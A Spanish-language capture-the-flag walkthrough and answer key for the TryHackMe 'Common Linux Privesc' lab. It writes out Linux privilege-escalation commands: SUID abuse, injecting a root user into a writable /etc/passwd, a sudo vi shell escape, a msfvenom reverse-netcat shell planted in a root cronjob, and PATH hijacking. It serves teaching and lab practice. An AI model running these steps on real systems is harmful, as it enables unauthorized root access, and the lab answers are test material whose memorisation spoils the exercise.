# Common Linux Privesc

| **Dificultad** | Easy |
| **Tipo** | Escalada de privilegios (laboratorio) |
| **Slug** | `commonlinuxprivesc` |
| **Link** | [TryHackMe](https://tryhackme.com/room/commonlinuxprivesc) |
| **Sección** | 01 Level Easy |
| **Fuente** | TryHackMe |
| **Componentes** | SSH / LinEnum / Kernel exploits / sudo / SUID / Crontab / PATH |
| **Impacto** | Laboratorio guiado sobre las técnicas más comunes de escalada de privilegios en Linux: de un usuario normal a root mediante enumeración, exploits de kernel, archivos SUID, crontab y manipulación de la variable PATH. |

---

**Contexto:** La sala explica la escalada de privilegios en Linux y cómo pasar de un usuario de bajos privilegios a root. Comienza con la enumeración del sistema (LinEnum), sigue con el abuso de binarios SUID, la escritura de `/etc/passwd`, la escapada del editor vi por sudo, el secuestro de cronjobs con reverse shells de msfvenom y termina manipulando la variable PATH para que un script SUID ejecute un binario falso.

## Solucionario

### Task 1: Conexión

**Explicación:** Despliegue de la máquina objetivo y conexión a la red de TryHackMe (VPN o AttackBox) para poder alcanzarla.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Despliega la máquina y conéctate a la red de TryHackMe. | `No answer needed` |

### Task 2: Comprendiendo la escalada de privilegios

**Explicación:** Concepto de escalada de privilegios en Linux: pasar de un usuario normal a otro o a root aprovechando malas configuraciones o vulnerabilidades. Solo teoría.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la información sobre escalada de privilegios. | `No answer needed` |

### Task 3: Dirección de la escalada de privilegios

**Explicación:** Distinción clave: escalada *horizontal* (mismo nivel, otro usuario) vs *vertical* (a root). El resto de la sala se centra en la vertical.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Entiende la diferencia entre escalada horizontal y vertical. | `No answer needed` |

### Task 4: Enumeración

**Explicación:** Con `ssh user0@TARGET` (contraseña `password`) se entra al sistema. La enumeración descubre: hostname `polobox`, 8 cuentas `user[x]` en `/etc/passwd`, 4 shells en `/etc/shells`, el cronjob `autoscript.sh` (cada 5 min) y que `/etc/passwd` quedó escribible.

```bash
ssh user0@MACHINE_IP     # password
hostname
grep -c "user[0-9]" /etc/passwd
cat /etc/shells
cat /etc/crontab
ls -l /etc/passwd
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Conéctate por SSH al objetivo con las credenciales usero:password. | `No answer needed` |
| 2 | ¿Cuál es el hostname del sistema objetivo? | `polobox` |
| 3 | Mira el archivo /etc/passwd. ¿Cuántas cuentas "user[x]" hay en el sistema? | `8` |
| 4 | ¿Cuántas shells disponibles hay en el sistema? | `4` |
| 5 | ¿Cómo se llama el script bash que se ejecuta cada 5 minutos por cron? | `autoscript.sh` |
| 6 | ¿Qué archivo crítico ha cambiado sus permisos para permitir que algunos usuarios escriban en él? | `/etc/passwd` |
| 7 | Ten en cuenta los resultados de la enumeración para continuar explotando el sistema. | `No answer needed` |

### Task 5: Abusando de archivos SUID/GUID

**Explicación:** En `/home/user3` destaca el binario `/home/user3/shell`, con bit SUID activo: ejecutarlo da una shell con los privilegios root (al ser SUID de root). Desde esa shell `su user8` con `password` permite cambiar de cuenta.

```bash
find / -perm -u=s 2>/dev/null
cd /home/user3 && ./shell
su user8      # password
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué archivo del directorio de user3 destaca sobre los demás? | `/home/user3/shell` |
| 2 | Sabemos que "shell" tiene el bit SUID activado; ¡ejecútalo como root y explótalo! | `No answer needed` |
| 3 | Usa "su" para cambiarte a user8 con la contraseña "password". | `No answer needed` |

### Task 6: Explotando el kernel

**Explicación:** Con `/etc/passwd` escribible se inyecta un usuario root. Se genera un hash MD5crypt con `openssl passwd -1 -salt new password`, dando `$1$new$p7ptkEKU1HnaHpRtzNizS1`. La línea completa (UID 0) es `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`; al añadirla, `su new` da root (escala *vertical*).

```bash
openssl passwd -1 -salt new password
echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
su new
id
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Sigue la guía de explotación del kernel contra la máquina objetivo. | `No answer needed` |
| 2 | ¿Qué tipo de escalada de privilegios permite un usuario no privilegiado pasar a ser root? | `vertical` |
| 3 | ¿Cuál es la contraseña hash generada para el nuevo usuario root? | `$1$new$p7ptkEKU1HnaHpRtzNizS1` |
| 4 | Investiga cómo escribir correctamente la línea de /etc/passwd. ¿Cuál es la línea completa del nuevo usuario root? | `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash` |
| 5 | Añade la línea al archivo /etc/passwd y cambia de usuario a root. | `No answer needed` |
| 6 | Comprueba tus permisos con "id" al haber pasado a root. | `No answer needed` |

### Task 7: Explotando sudo

**Explicación:** `sudo -l` muestra que `vi` se puede ejecutar como root sin pedir contraseña (`NOPASSWD`). Dentro de vi, `:!sh` abre una shell de root.

```bash
sudo -l
sudo vi
:!sh
id
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Sal de root con "exit" y usa "su" para pasarte al usuario del laboratorio. | `No answer needed` |
| 2 | Usa el comando "sudo -l". ¿Qué requiere (o no requiere) este usuario para ejecutar vi como root? | `NOPASSWD` |
| 3 | Abre vi como root escribiendo "sudo vi" en la terminal. | `No answer needed` |
| 4 | Escribe ":!sh" para abrir una shell como root. | `No answer needed` |

### Task 8: Explotando Crontab

**Explicación:** El cronjob `autoscript.sh` (en `/home/user4/Desktop`) se ejecuta como root cada 5 minutos. Como el archivo es escribible por user4, se sustituye su contenido por un payload `cmd/unix/reverse_netcat` de msfvenom (bandera `-p`) y se espera la reverse shell en `nc -lvnp 8888`.

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
echo '<payload>' > /home/user4/Desktop/autoscript.sh
nc -lvnp 8888
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Sal de root con "exit" y usa "su" para pasarte a user4 con la contraseña "password". | `No answer needed` |
| 2 | Ahora, en tu máquina atacante, crea un payload para el exploit de cron usando msfvenom. | `No answer needed` |
| 3 | ¿Cuál es la bandera de msfvenom para especificar un payload? | `-p` |
| 4 | Crea un payload usando: `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R` | `No answer needed` |
| 5 | ¿En qué directorio se encuentra el archivo "autoscript.sh"? | `/home/user4/Desktop` |
| 6 | Sustituye el contenido del archivo por tu payload con `echo [SALIDA MSFVENOM] > autoscript.sh`. | `No answer needed` |
| 7 | Espera a que cron ejecute el archivo y arranca un listener con `nc -lvnp 8888`. | `No answer needed` |
| 8 | Pasados unos 5 minutos deberías recibir una shell como root. | `No answer needed` |

### Task 9: Explotando la variable PATH

**Explicación:** El script SUID de user5 invoca `ls` sin ruta absoluta. Se crea una imitación `ls` en `/tmp`: `echo "/bin/bash" > ls` y `chmod +x ls`. Con `export PATH=/tmp:$PATH` el script ejecuta nuestra imitación (secuestro del PATH), abriendo una shell root.

```bash
cd /tmp
echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
cd /home/user5 && ./script
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Ve al directorio home de user5 y ejecuta el archivo "script" para entender qué hace. | `No answer needed` |
| 2 | ¿Qué comando crees que está ejecutando el script? | `ls` |
| 3 | Crea tu propia imitación ejecutable del comando llamada "ls" en /tmp. | `No answer needed` |
| 4 | ¿Qué comando escribe la siguiente línea en el archivo: `echo "/bin/bash" > ls`? | `echo "/bin/bash" > ls` |
| 5 | ¿Qué comando hace que tu imitación "ls" sea ejecutable? | `chmod +x ls` |
| 6 | Cambia la variable PATH para que apunte al directorio de tu imitación con `export PATH=/tmp:$PATH`. | `No answer needed` |
| 7 | Vuelve al directorio home de user5. | `No answer needed` |
| 8 | Ejecuta de nuevo el archivo "script": deberías obtener una shell de root. | `No answer needed` |

### Task 10: Resumen

**Explicación:** Repaso de todas las técnicas vistas: enumeración, SUID, abuso de sudo, cronjobs y PATH hijacking.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Repasa las técnicas aprendidas para escalar privilegios en Linux. | `No answer needed` |

---

**Metodología:** Se entra por SSH con un usuario de bajos privilegios y se automatiza la enumeración (hostname, usuarios y shells de /etc/passwd y /etc/shells, cronjobs en /etc/crontab, archivos escribibles) con LinEnum. Cada hallazgo se explota por separado: el binario SUID da shell inmediata, se escribe un usuario root en un /etc/passwd escribible usando `openssl` para generar el hash MD5crypt, se escapa de vi vía sudo NOPASSWD, se inyecta un payload de msfvenom en autoscript.sh ejecutado por cron y, por último, se secuestra la ruta del comando "ls" (que el script SUID invoca sin ruta absoluta) manipulando la variable PATH.

**Learning chain:** enumeración → SUID → exploits de kernel → abuso de sudo → cronjobs → manipulación del PATH.

**MITRE ATT&CK:** T1068 (Exploitation for Privilege Escalation), T1548 (Abuse Elevation Control Mechanism), T1548.001 (Setuid and Setgid), T1053.003 (Scheduled Task/Job: Cron), T1574.007 (Path Hijacking), T1222 (File and Directory Permissions Modification)

**Fuente:** [TryHackMe - Common Linux Privesc](https://tryhackme.com/room/commonlinuxprivesc)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
